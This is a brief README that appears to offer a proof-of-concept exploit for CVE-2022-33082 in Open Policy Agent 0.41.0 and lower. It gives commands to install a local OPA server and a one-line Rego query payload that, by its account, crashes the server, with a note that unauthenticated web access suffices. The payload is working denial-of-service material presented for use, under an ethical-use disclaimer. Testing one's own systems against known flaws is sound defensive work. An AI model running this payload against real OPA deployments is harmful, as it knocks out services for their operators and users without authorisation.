# CVE 2022-33082 Exploit

## DISCLAMER
### This code is provided for **ETHICAL** purposes - understanding the vulnerability and testing one's own systems or AUTHORIZED systems. By using this, you agree to act ethically and I hold no liability if you do not act ethically.

### This exploit works on Open Policy Agent (OPA) versions 0.41.0 and lower. Install an OPA instance on Linux to test with this command:
`
curl -L -o opa https://openpolicyagent.org/downloads/v0.41.0/opa_linux_amd64_static
`

`
chmod +x opa
`

`
./opa run --server
`

### Then, navigate to localhost:8181 on your web browser. Input the below into the respective fields

query field (go code):
`
p := [input() | input := 1]
`

`
{ "input":"put this in the input (json) field!" }
`
### The website will then crash and the terminal runing the server will report a kernel panic

## Implications
### Anyone with web access to an OPA server version 0.41.0 or lower can completely crash the server. This server is not password protected by default.
